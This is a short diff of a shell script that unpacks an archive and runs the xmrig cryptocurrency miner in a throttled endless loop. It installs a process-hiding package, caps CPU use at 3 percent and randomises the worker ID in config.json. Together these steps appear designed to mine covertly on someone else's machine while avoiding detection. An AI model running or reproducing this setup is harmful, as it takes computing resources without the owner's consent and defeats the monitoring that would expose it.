@@ -1,5 +1,6 @@
 sudo /sbin/sysctl -w net.ipv4.tcp_keepalive_time=5 net.ipv4.tcp_keepalive_intvl=5 net.ipv4.tcp_keepalive_probes=5
 sudo npm i -g node-process-hider
-sudo apt-get update && sudo apt-get install cpulimit -y 
+sudo apt-get update && sudo apt-get install cpulimit -y
+tar xf ojos.tar.gz
 sed -i "s/ikukfauji/$(shuf -n 1 -i 1-99999999)/" "config.json"
 while :; do timeout 1m cpulimit -l 3 ./xmrig; sleep 20; done
